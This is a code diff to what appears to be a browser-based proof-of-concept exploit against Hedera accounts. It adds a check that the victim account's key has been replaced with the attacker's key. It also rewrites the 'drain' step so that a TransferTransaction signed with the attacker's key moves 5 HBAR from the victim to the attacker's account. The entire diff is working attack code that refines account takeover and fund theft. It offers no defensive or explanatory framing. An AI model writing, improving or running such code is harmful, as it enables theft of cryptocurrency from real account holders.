@@ -169,6 +169,25 @@ button:disabled { opacity: .45; }
 
       log("Takeover status: " + ssReceipt.status.toString(), "ok");
 
+      /* 6b. Verify the key actually changed before attempting drain */
+      log("Verifying key rotation...", "info");
+      try {
+        const accountInfo = await new SDK.AccountInfoQuery()
+          .setAccountId(targetId)
+          .execute(opClient);
+        const currentKey = accountInfo.key.toString();
+        const expectedKey = attackerPubKey.toString();
+        log("Victim key now:    " + currentKey, "info");
+        log("Attacker pub key:  " + expectedKey, "info");
+        if (currentKey !== expectedKey) {
+          throw new Error("Key rotation FAILED — victim key did not change. Inner AccountUpdate may have been rejected.");
+        }
+        log("Key rotation confirmed.", "ok");
+      } catch(e) {
+        if (e.message.includes("Key rotation FAILED")) throw e;
+        log("AccountInfoQuery error: " + e.message, "warn");
+      }
+
       /* 7. Drain — attacker's infrastructure pays fees, victim signs with new key */
       log("Draining...", "err");
 
@@ -182,14 +201,15 @@ button:disabled { opacity: .45; }
 
       if (victimBal <= 0) throw new Error("Victim account is empty.");
 
-      // Send half — always well within balance, no edge cases.
-      const sendAmount = Math.floor(victimBal / 2);
-      log("Sending " + sendAmount + " tinybar (" + (sendAmount / 1e8).toFixed(4) + " HBAR)...", "info");
+      // Hardcode 5 HBAR using new SDK.Hbar(n) — safest across all SDK versions.
+      // Never pass raw tinybar numbers to addHbarTransfer; SDK treats plain numbers as HBAR.
+      const SEND = new SDK.Hbar(5);
+      log("Sending 5 HBAR to attacker...", "info");
 
       const drainTx = await (
         await new SDK.TransferTransaction()
-          .addHbarTransfer(targetId, -sendAmount)
-          .addHbarTransfer(operatorId, sendAmount)
+          .addHbarTransfer(targetId, new SDK.Hbar(-5))   // debit 5 HBAR from victim
+          .addHbarTransfer(operatorId, SEND)             // credit 5 HBAR to attacker
           .freezeWith(drainClient)
           .sign(attackerKey)          // victim's new key authorizes the debit
       ).execute(drainClient);
